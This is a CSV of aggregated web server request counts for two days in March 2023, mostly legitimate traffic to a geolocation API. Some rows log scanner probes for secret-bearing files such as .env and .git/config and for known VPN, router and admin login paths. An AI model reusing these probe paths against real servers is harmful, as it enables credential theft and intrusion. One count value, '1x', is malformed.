date,status_code,method,url,count
29/Mar/2023,301,POST,/credentials,2
29/Mar/2023,301,POST,/demo/.env,2
29/Mar/2023,301,POST,/enviroments/.env.production,1
29/Mar/2023,301,POST,/laravel/.env,2
29/Mar/2023,301,POST,/live_env,1
29/Mar/2023,301,POST,/phpinfo,1
29/Mar/2023,301,POST,/rest/.env,1
29/Mar/2023,301,POST,/script/.env,1
29/Mar/2023,301,POST,/sources/.env,1
29/Mar/2023,301,POST,/system/.env,1
29/Mar/2023,301,POST,/test.php,3
29/Mar/2023,307,GET,/,9624
29/Mar/2023,307,GET,/+CSCOE+/logon.html,1
29/Mar/2023,307,GET,/.env,2
29/Mar/2023,307,GET,/.git/config,1
29/Mar/2023,307,GET,/.well-known/security.txt,1
29/Mar/2023,307,GET,/ISAPI/Security/userCheck,1
29/Mar/2023,307,GET,/_profiler/phpinfo,1
29/Mar/2023,307,GET,/admin/index.html,1
29/Mar/2023,307,GET,/index.html,1
29/Mar/2023,307,GET,/manage/account/login,1
29/Mar/2023,307,GET,/owa/auth/logon.aspx,1
29/Mar/2023,307,GET,/remote/fgt_lang,3
29/Mar/2023,307,GET,/robots.txt,1
29/Mar/2023,307,GET,/sitemap.xml,1
29/Mar/2023,307,GET,/t4,1
29/Mar/2023,307,GET,/yuuki?pp=env,2
29/Mar/2023,307,HEAD,/Core/Skin/Login.aspx,26
29/Mar/2023,307,POST,/,7
29/Mar/2023,308,GET,/api/amenities-comparison-chart/,1
29/Mar/2023,308,GET,/api/geolocation/,3
29/Mar/2023,308,GET,/api/therapy-comparison-chart/,1
29/Mar/2023,308,GET,/v2/,1
29/Mar/2023,308,POST,/api/geolocation/,22933
29/Mar/2023,401,GET,/api/therapy-comparison-chart,1
29/Mar/2023,401,GET,/apis/apps/v1/namespaces/kube-system/daemonsets,2
29/Mar/2023,401,POST,/api/v0/id,1
29/Mar/2023,404,GET,/favicon.ico,15
29/Mar/2023,422,POST,/api/geolocation,10547
29/Mar/2023,499,GET,/api/geolocation,5
30/Mar/2023,200,GET,/api/auth/signin,6
30/Mar/2023,200,POST,/api/geolocation,2521
30/Mar/2023,301,GET,/,9
30/Mar/2023,301,GET,/.well-known/security.txt,1
30/Mar/2023,301,GET,/favicon.ico,1
30/Mar/2023,301,GET,/geoip/,1x
30/Mar/2023,301,GET,/sitemap.xml,1
30/Mar/2023,301,HEAD,/Core/Skin/Login.aspx,1
30/Mar/2023,301,POST,/api/v0/id,1
30/Mar/2023,301,POST,/boaform/admin/formLogin,1
30/Mar/2023,307,GET,/,1455
30/Mar/2023,307,GET,/.env,1
30/Mar/2023,307,HEAD,/Core/Skin/Login.aspx,5
30/Mar/2023,308,POST,/api/geolocation/,3994
30/Mar/2023,401,GET,/apis/apps/v1/namespaces/kube-system/daemonsets,1
30/Mar/2023,422,POST,/api/geolocation,1477
